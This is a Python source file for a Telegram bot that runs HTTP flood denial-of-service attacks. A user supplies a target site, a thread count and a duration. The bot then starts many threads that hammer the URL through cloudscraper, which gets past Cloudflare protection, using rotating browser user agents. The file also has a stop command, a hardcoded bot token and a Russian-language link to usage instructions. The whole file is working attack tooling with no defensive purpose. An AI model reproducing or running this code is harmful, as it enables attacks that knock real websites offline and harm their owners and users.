import telebot
import threading
import cloudscraper
import datetime
import time
import random

stop_attack = False

def generate_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Mi 10T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
    ]
    return random.choice(user_agents)

def launch_attack(url, threads, attack_time):
    global stop_attack
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(attack_time))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(threads) and not stop_attack:
        try:
            th = threading.Thread(target=attack_cfb, args=(url, until, scraper))
            th.start()
            threads_count += 1
        except:
            pass

def attack_cfb(url, until_datetime, scraper):
    global stop_attack
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0 and not stop_attack:
        try:
            headers = {"User-Agent": generate_user_agent()}
            scraper.get(url, headers=headers, timeout=10)
        except:
            pass

bot = telebot.TeleBot("6585465401:AAHq4iSOLb_v-2VrKNB170g_ZDQnGQcA0iA")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, " development @AndreyKetanov @KetanovInfo как использовать бота? - https://telegra.ph/kak-ispolzovat-bota-AndreyKetanov-bot-11-14")

@bot.message_handler(commands=['attack'])
def attack(message):
    global stop_attack
    if stop_attack:
        stop_attack = False
        bot.send_message(message.chat.id, "attack resumed")
    else:
        bot.send_message(message.chat.id, "⚠️ enter site :")
        bot.register_next_step_handler(message, attack_url)

def attack_url(message):
    global stop_attack
    url = message.text
    bot.send_message(message.chat.id, "threads:")
    bot.register_next_step_handler(message, attack_threads, url)

def attack_threads(message, url):
    global stop_attack
    threads = message.text
    bot.send_message(message.chat.id, "attack time only 120 seconds :")
    bot.register_next_step_handler(message, attack_time, url, threads)

def attack_time(message, url, threads):
    global stop_attack
    attack_time = message.text
    bot.send_message(message.chat.id, f"attack successfull⚠️! {url} using {threads} threads for {attack_time} second.")
    stop_attack = False
    threading.Thread(target=launch_attack, args=(url, threads, attack_time)).start()

@bot.message_handler(commands=['stop'])
def stop(message):
    global stop_attack
    stop_attack = True
    bot.send_message(message.chat.id, "attack stopped❎")

bot.polling()